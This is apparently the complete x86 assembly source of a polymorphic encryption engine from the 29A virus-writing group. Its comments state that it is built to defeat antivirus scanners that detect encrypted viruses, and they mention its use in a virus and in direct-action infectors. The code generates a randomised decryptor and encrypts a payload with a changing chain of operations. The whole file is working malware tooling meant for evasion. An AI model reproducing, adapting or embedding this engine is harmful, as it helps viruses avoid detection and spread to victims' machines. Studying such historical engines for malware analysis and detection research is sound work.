   ;=====( Fucking Small Engine - by Rajaat / 29A )===============================
   ;
   ; Type     : Polymorphic Engine
   ; Comments : This polymorphic engine is very easy to detect, since uses no
   ;            random trash code or anything else to complicate detecting the
   ;            decryptor itself, but this is made to see how you could defeat
   ;            scanners that still use the (in my opinion obsolete) XRAY
   ;            technique to detect encrypted viruses. FSE uses 8-15
   ;            different operations on each byte, making it virtually
   ;            impossible to do a cryptanalytic attack.
   ;
   ;            Operands used by FSE to encrypt code:
   ;            XOR   SUB   ADD   ROL   ROR   NOT   NEG   INC   DEC
   ;
   ;            Registers used by FSE as pointer:
   ;            BX    SI    DI
   ;
   ;            Registers used by FSE as counter:
   ;            AX    BX    CX    DX    SI    DI    BP
   ;
   ;=====( Fucking Small Engine - by Rajaat )=====================================
   ;
   ; DS:SI = code to encrypt
   ; ES:DI = place for encrypted code + decryptor
   ; CX    = code length to encrypt
   ; AX    = offset in target
   ;
   ;==============================================================================
   .model tiny
   .code
   .radix 16

   public C fse                                    ; yes, I used it in my Borland
                                                   ; C virus :-D

   fse             proc C                          ; fse()

                   push bp                         ; preserve BP

                   call get_offset                 ; get delta offset (in case you
   get_offset:     pop bp                          ; are making a direct action
                   sub bp,offset get_offset        ; infector)

                   push di es                      ; save some registers I need
                   push si                         ; later on
                   push cx                         ;
                   push ax                         ;
                   push di                         ;
                   push di                         ;
                   cld                             ;

                   push es                         ; clear encrypt code buffer
                   push cs                         ; (there was a bug in here when
                   pop es                          ; this source was on my home
                   lea si,end_sequencer[bp]        ; page, it ES != CS it would
                   lea di,enc_sequencer[bp]        ; make incorrect encryptions)
                   mov al,90                       ;
                   push cx                         ;
                   mov cx,len_sequencer            ;
                   rep stosb                       ;
                   pop cx                          ;

                   pop es                          ;
                   pop di                          ;

                   mov ax,1f0e                     ; write PUSH CS / POP DS
                   stosw                           ; sequence (wow, fixed code)

   bad_registers:  call rnd_get
                   and ax,0707
                   cmp ah,al                       ; pointer & counter can't be
                   je bad_registers                ; the same register
                   cmp al,4                        ; don't use SP!
                   je bad_registers
                   cmp ah,03                       ; BX is pointer register
                   je good_pointer
                   cmp ah,6                        ; or else FSE uses SI or DI as
                   jb bad_registers                ; index register
   good_pointer:   push ax
                   sub ah,6
                   cmp ah,08
                   jb convert_ok
                   mov ah,3
   convert_ok:     mov byte ptr cs:pointer_reg[bp],ah
                   pop ax
                   add ax,0b8b8
                   push ax
                   call rnd_get
                   mov bx,1
                   inc ax
                   pop ax
                   jns dont_flip
                   xchg ah,al
                   xchg bh,bl
   dont_flip:      stosb
                   mov dx,di
                   test bl,1
                   push ax
                   jz no_counter
                   call rnd_get
                   and ax,1ff
                   add ax,cx
   no_counter:     stosw
                   pop ax
                   xchg ah,al
                   stosb
                   push ax bx
                   test bl,1
                   jnz is_counter
                   and ax,1ff
                   add ax,cx
                   jmp store
   is_counter:     mov dx,di
   store:          stosw
                   mov cx,di
                   push cx

                   call rnd_get
                   mov cx,ax
                   and cx,7
                   add cx,7

   encrypt_actions:

                   call rnd_get
   no_more_than_8: and ax,1f
                   sub ax,8
                   cmp ax,8
                   ja no_more_than_8
                   shl ax,1
                   mov bx,ax
                   add bx,bp
                   mov ax,word ptr cs:enc_opers[bx]
                   test ah,80
                   jnz no_xor_add_sub
                   mov ah,80
                   add al,byte ptr cs:pointer_reg[bp]
                   xchg ah,al
                   stosw
                   call rnd_get
                   stosb
                   jmp xor_add_sub
   no_xor_add_sub: sub ah,0bc
                   add ah,byte ptr cs:pointer_reg[bp]
   no_bx:          stosw
   xor_add_sub:    mov bx,word ptr cs:dec_opers[bx]
                   cmp bh,0
                   jne no_xas
                   mov bh,al
   no_xas:         mov word ptr cs:[si],bx
                   dec si
                   dec si

                   loop encrypt_actions

                   pop cx

                   ;=== inc/dec pointer and counter
                   pop bx ax
                   test bl,1
                   jnz pointer_first
                   xchg ah,al
   pointer_first:  sub ax,7078
                   stosb
                   push ax
                   pop ax
                   xchg ah,al
                   stosb
                   ;=== building repeat loop
                   cmp al,49
                   mov al,75
                   jnz no_loop
                   dec di
                   mov al,0e2
   no_loop:        stosb
                   sub cx,di
                   dec cx
                   xchg ax,cx
                   stosb

                   xchg bx,dx
                   mov dx,di
                   pop ax
                   sub dx,ax
                   pop ax
                   add dx,ax
                   mov word ptr es:[bx],dx
                   pop cx
                   ;=== encrypt code
                   pop si
   encrypt_loop:   lodsb
                   call enc_sequencer
                   stosb
                   loop encrypt_loop
                   mov cx,di
                   pop ds dx
                   sub cx,dx
                   pop bp
                   ret

   rnd_get:        in al,40
                   xchg ah,al
                   in al,41
                   xor al,ah
                   ret

                   ;  XOR   SUB   ADD   ROL   ROR   NOT   NEG   INC   DEC
   enc_opers       dw 00034,0002c,00004,0c0d0,0c8d0,0d0f6,0d8f6,0c0fe,0c8fe
                   ;  XOR   ADD   SUB   ROR   ROL   NOT   NEG   DEC   INC
   dec_opers       dw 00034,00004,0002c,0c8d0,0c0d0,0d0f6,0d8f6,0c8fe,0c0fe

   fse_signature   db '[ FSE 1.0 by Rajaat / 29A ]',0

   enc_sequencer:  dw 18 dup (9090)        ; buffer for encryptor code
   end_sequencer   equ $-2
   len_sequencer   equ $-enc_sequencer
                   ret
   pointer_reg     db 0

   fse             endp

   end
